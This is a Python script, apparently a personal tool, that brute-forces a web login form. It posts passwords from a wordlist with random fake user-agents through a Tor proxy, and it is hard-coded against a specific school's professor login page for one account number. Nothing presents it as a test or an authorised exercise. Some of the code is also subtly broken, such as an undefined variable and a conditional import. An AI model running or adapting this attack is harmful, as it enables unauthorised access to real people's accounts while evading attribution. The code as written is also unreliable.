#!/usr/bin/env python3.6
import asyncio
import async_timeout
import aiohttp
import aiosocks
import json
from copy import copy

from fake_useragent import UserAgent, FakeUserAgentError
from aiosocks.connector import SocksConnector, HttpProxyAddr, HttpProxyAuth
try:
    from asyncio import JoinableQueue as Queue
except ImportError:
    from asyncio import Queue
    from asyncio import Event


class Netbrute:
    def __init__(self, aiohttp_session, target_url, payload_model, wordlist, error_string):
        self.queue = Queue()
        self.attack_url = target_url
        self.error_string = error_string
        self.payload = self._generate_payload_type(payload_model)
        self.session = aiohttp_session
        self.wordlist = wordlist
        self.found = Event()

    @staticmethod
    def _generate_payload_type(user_input):
        """
        Function responsible for transforming String type into Dictionary type
        :param user_input: str
        :return: d: dict
        """
        d = dict()
        p = [x.strip() for x in user_input.split(",")]
        for element in p:
            key, value = element.split(":")
            d[key] = value
        return d

    @staticmethod
    def _encode_payload_www(payload):
        """
        Function responsible for transforming a dictionary payload into x-www-form-urlencoded payload
        :param payload:
        :return:
        """
        pl = str()
        dict_len = len(payload)
        i = 1
        for key in payload:
            if i != dict_len:
                pl += "{0}={1}&".format(key, payload[key])
            else:
                pl += "{0}={1}".format(key, payload[key])
            i += 1
        return pl

    def _adjust_payload(self, password):
        tmp_payload = copy(self.payload)
        for key in tmp_payload:
            value = tmp_payload[key]
            if value.upper() == "PASS":
                tmp_payload[key] = password
        return tmp_payload

    async def attack_this(self, password):
        print("Started attack!")
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": ua.random,
        }
        custom_payload = self._adjust_payload(password)
        with async_timeout.timeout(10):
            async with self.session.post(self.attack_url, data=self._encode_payload_www(custom_payload), headers=headers,
                                         proxy="http://localhost:9050") as response:

                body, status, response_url = await response.text(), response.status, response.url
                if status == 200 and (self.error_string not in response_url):
                    self.found.set()

                print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, url))
                return

    def _read_wordlist(self):
        i = 0
        with open(self.wordlist, "r") as f:
            for line in f.readlines():
                self.queue.put_nowait(line.replace("\n", ""))
                i += 1
        return i

    @asyncio.coroutine
    def work(self):
        while not self.queue.empty() or self.found.is_set():
            password = yield from self.queue.get()
            yield from self.attack_this(password)
            self.queue.task_done()

    @asyncio.coroutine
    def initiate(self):
        print("Started initiation!")
        pass_number = self._read_wordlist()
        print("Program have read {0} passwords.".format(pass_number))
        workers = [asyncio.Task(self.work()) for _ in range(10)]
        yield from self.queue.join()
        for w in workers:
            w.cancel()
        print("Ended initiation!")


if __name__ == "__main__":
    try:
        ua = UserAgent()
    except FakeUserAgentError:
        print("[!] Error generating fake user-agents.")
        pass

    loop = asyncio.get_event_loop()

    wordlist = "num8.txt"
    payload = "login:179 , senha:PASS,enviar:OK "
    url = "http://cepein.femanet.com.br/areprofessor/login/proc_loginAlPro.jsp"
    error_string = "incorreta"
    addr = aiosocks.Socks5Addr('127.0.0.1', 9050)
    auth = aiosocks.Socks5Auth('proxyuser99', password='pwd11111')
    conn = SocksConnector(proxy=addr, proxy_auth=auth, remote_resolve=True)
    session = aiohttp.ClientSession(loop=loop, connector=conn)
    net = Netbrute(session, url, payload, wordlist, error_string)
    loop.run_until_complete(net.initiate())
